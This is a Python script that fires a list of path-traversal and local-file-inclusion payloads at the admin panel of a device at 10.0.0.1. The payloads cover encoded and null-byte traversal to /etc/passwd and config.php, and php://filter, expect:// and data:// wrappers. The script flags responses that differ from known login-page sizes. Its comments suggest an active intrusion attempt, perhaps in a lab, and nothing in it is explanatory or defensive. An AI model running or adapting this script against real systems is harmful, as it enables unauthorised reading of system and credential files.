import requests

TARGET = "http://10.0.0.1"
ADMIN = f"{TARGET}/admin/index"

# Test path traversal in action parameter
print("=== Path Traversal in action ===")

# Known working actions: forgot.js (6258b), captcha.js (163b)
# Try to read system files via traversal from these

traversal_payloads = [
    # From admin root
    "action=../config.php",
    "action=../execute.php",
    "action=../install.php",
    "action=../backup.php",
    
    # Path traversal from views directory
    "action=../../../etc/passwd",
    "action=../../../../etc/passwd",
    "action=../../../../../etc/passwd",
    "action=../../../../../../etc/passwd",
    
    # Try null byte injection
    "action=../../../etc/passwd%00",
    "action=../../../etc/passwd%00.js",
    
    # Try encoded traversal
    "action=..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "action=..%252F..%252F..%252F..%252Fetc%252Fpasswd",
    
    # Try with .js suffix
    "action=../../../etc/passwd.js",
    "action=../../../etc/hostname.js",
    
    # Try to read files we know exist
    "action=../../../admin/index.php",
    "action=../../../var/www/html/admin/index.php",
    "action=../../../etc/bluetooth/bluetooth/heartbeat.py",
    
    # Try to read config files
    "action=../../../etc/txt/config.txt",
    "action=../../../etc/bluetooth/bluetooth/config.ini",
    "action=../config.php.old",
    
    # Try LFI via PHP wrappers
    "action=php://filter/convert.base64-encode/resource=../config.php",
    "action=php://filter/convert.base64-encode/resource=../../../etc/passwd",
    "action=expect://id",
    "action=data://text/plain;base64,dGVzdA==",
    
    # Try Windows-style paths (device runs Linux, but just in case)
    "action=../../../../Windows/system32/drivers/etc/hosts",
]

# For each payload, check if response differs from 0b (redirect) or 6258b/5353b (login pages)
for payload in traversal_payloads:
    try:
        resp = requests.get(f"{ADMIN}?{payload}", timeout=5, allow_redirects=False)
        length = len(resp.text)
        status = resp.status_code
        
        # Key indicators: non-empty response that's NOT a login page
        if length > 0 and length not in [5353, 6258, 163, 133]:
            print(f"\n[!] INTERESTING: {payload}")
            print(f"    Status: {status}, Length: {length}b")
            print(f"    Content: {resp.text[:200]}")
        elif length > 0:
            pass  # Expected response
    except Exception as e:
        pass

# Also try the forgot.js with extra parameters
print("\n=== Forgot.js with extra params ===")
extra_params = [
    {"action": "forgot.js", "page": "../../../etc/passwd"},
    {"action": "forgot.js", "file": "../../../etc/passwd"},
    {"action": "forgot.js", "template": "../../../etc/passwd"},
    {"action": "forgot.js", "view": "../../../etc/passwd"},
    {"action": "forgot.js", "include": "../../../etc/passwd"},
    {"action": "forgot.js", "path": "../../../etc/passwd"},
    {"action": "forgot.js", "load": "../../../etc/passwd"},
]

for params in extra_params:
    try:
        resp = requests.get(ADMIN, params=params, timeout=5)
        length = len(resp.text)
        if length not in [5353, 6258, 163, 0]:
            print(f"  {params}: [{length}b] {resp.text[:100]}")
    except:
        pass

print("\nDone.")
